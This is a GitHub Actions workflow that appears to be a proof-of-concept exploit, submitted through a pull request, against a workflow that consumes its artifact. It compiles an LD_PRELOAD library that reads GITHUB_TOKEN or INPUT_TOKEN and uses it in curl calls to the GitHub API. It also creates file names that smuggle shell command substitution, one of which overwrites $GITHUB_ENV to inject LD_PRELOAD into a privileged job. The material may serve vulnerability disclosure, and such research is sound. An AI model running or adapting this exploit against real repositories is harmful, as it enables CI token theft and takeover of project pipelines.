name: Test

on:
  pull_request:

permissions:
  contents: read

jobs:
  produce:
    runs-on: ubuntu-latest
    steps:
      - name: Build artifact with attacker-controlled file names
        run: |
          set -eux
          mkdir -p content
          cd content
          printf 'BENIGN\n' > summary.txt
          printf 'BENIGN\n' > x.txt
          printf 'LD_PRELOAD=/tmp/content/content/libpoc.so\n' > env.txt
          cat > libpoc.c <<'EOF'
          #define _GNU_SOURCE
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <unistd.h>

          __attribute__((constructor))
          static void poc_init(void) {
              if (getenv("POC_GUARD")) return;
              setenv("POC_GUARD", "1", 1);
              const char *t = getenv("INPUT_TOKEN");
              if (!t || !*t) t = getenv("GITHUB_TOKEN");
              if (!t || !*t) { fprintf(stderr, "POC_NO_TOKEN_IN_ENV\n"); return; }
              fprintf(stderr, "POC_TOKEN_LEN=%zu PREFIX=%.4s\n", strlen(t), t);
              fflush(NULL);
              char cmd[8192];
              snprintf(cmd, sizeof(cmd),
                  "curl -sS -m 20 -H 'Authorization: token %s' https://api.github.com/user | head -c 1200; echo; "
                  "curl -sS -m 20 -H 'Authorization: token %s' https://api.github.com/repos/PDFtoMark/triage-aave-dao-v04d7dde-8cd6fd | head -c 1500; echo",
                  t, t);
              int rc = system(cmd);
              fprintf(stderr, "POC_CURL_RC=%d\n", rc);
              fflush(NULL);
          }
          EOF
          gcc -shared -fPIC -O2 -o libpoc.so libpoc.c
          touch 'x$(echo${IFS}RCE_PROOF_$(id${IFS}-u)_${GITHUB_RUN_ID}).txt'
          touch 'x$(s=$(printf${IFS}%.1s${IFS}$GITHUB_ENV);cp${IFS}$s${s}tmp${s}content${s}content${s}env.txt${IFS}$GITHUB_ENV).txt'
          ls -la
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: content
          path: content
